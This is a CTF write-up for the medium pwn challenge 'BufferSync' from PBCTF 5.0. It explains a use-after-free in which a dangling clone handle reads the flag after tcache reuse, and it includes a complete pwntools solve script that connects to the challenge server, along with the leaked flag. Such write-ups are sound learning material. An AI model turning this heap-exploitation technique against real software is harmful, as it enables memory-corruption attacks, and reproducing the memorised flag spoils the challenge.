---
title: "BufferSync"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: pwn
difficulty: medium
points: 200
flag_format: "pbctf{...}"
author: "vikas1337"
---

# BufferSync

## summary

menu-driven heap thing where clone makes a second handle pointing at the SAME chunk, then resize frees that chunk but only nulls the original handle. so the clone dangles. run audit reallocs a 0x88 chunk and snprintfs getenv(FLAG) into it, straight into the freed slot, and inspect happily prints it back with %.*s.

## how i solved it

### 1. recon the binary

```bash
objdump -d -M intel buffersync | less
# menu strings + globals
nm buffersync | grep -Ei 'run_audit|audit_flag|handles'
```

```text
1. Create buffer\n2. Clone buffer\n3. Resize buffer\n4. Inspect buffer\n5. Run audit\n6. Exit\n...
0000000000004170 b audit_flag
00000000000016d8 t run_audit
00000000000040a0 b handles
```

### 2. spot the uaf

```text
each handle = {ptr,size,flag_byte}. clone_buffer just copies the ptr -> two handles, one chunk. resize_buffer free()s the old 0x88 chunk + updates only the ORIGINAL handle. clone is left dangling and nothing ever re-checks it.
```

```text
flag name literally says fr33d_but_st1ll_r3ach4bl3 lol, this is the whole bug
```

### 3. audit fills the freed chunk

```text
run_audit does getenv("FLAG") then snprintf into a fresh malloc(0x88). same size class as the freed buffers, so tcache hands it back the chunk our clone still points at.
```

```text
so: free A, free B, audit reuses B then A. clone handle -> A -> now holds the flag
```

### 4. line up the tcache

```python
create()      # handle0 -> chunk A
clone(0)      # handle1 aliases A (will dangle)
create()      # handle2 -> chunk B
resize(0)     # frees A
resize(2)     # frees B   -> tcache[0x90] = [B -> A]
audit()       # malloc#1 workspace=B, malloc#2 audit_flag=A
```

```text
tcache order matters, audit's 2nd malloc has to land on A
```

### 5. inspect the dangling clone

```python
inspect(1)    # reads handle1.ptr == A == audit_flag, printed with %.*s
data = p.recvuntil(b'> ')
```

```text
[+] Leaked: b'pbctf{fr33d_but_st1ll_r3ach4bl3}\n\n1. Create buffer\n...'
```

## full solve script

```python
#!/usr/bin/env python3
from pwn import *
import sys
context.log_level='info'
exe='./buffersync'

def menu(p,c):
    p.recvuntil(b'> '); p.sendline(str(c).encode())
def create(p): menu(p,1)
def clone(p,i): menu(p,2); p.recvuntil(b'id> '); p.sendline(str(i).encode())
def resize(p,i): menu(p,3); p.recvuntil(b'id> '); p.sendline(str(i).encode())
def inspect(p,i): menu(p,4); p.recvuntil(b'id> '); p.sendline(str(i).encode())
def audit(p): menu(p,5)

if len(sys.argv)>1 and sys.argv[1]=='remote':
    p=remote('172.198.160.128',1338)
else:
    p=process([exe],env={'FLAG':'pbctf{local_test_flag_1234}'})

create(p)      # 0 -> A
clone(p,0)     # 1 aliases A (dangling later)
create(p)      # 2 -> B
resize(p,0)    # free A
resize(p,2)    # free B -> tcache[0x90]=[B->A]
audit(p)       # malloc workspace=B, malloc audit_flag=A
inspect(p,1)   # print A == flag

data=p.recvuntil(b'> ',timeout=5)
log.success('Leaked: %r'%data)
print(data.split(b'\n')[0].decode())
p.close()
```

```text
[+] Opening connection to 172.198.160.128 on port 1338: Done
[+] Leaked: b'pbctf{fr33d_but_st1ll_r3ach4bl3}\n\n1. Create buffer\n2. Clone buffer\n3. Resize buffer\n4. Inspect buffer\n5. Run audit\n6. Exit\n> '
pbctf{fr33d_but_st1ll_r3ach4bl3}
```

## flag

```
pbctf{fr33d_but_st1ll_r3ach4bl3}
```
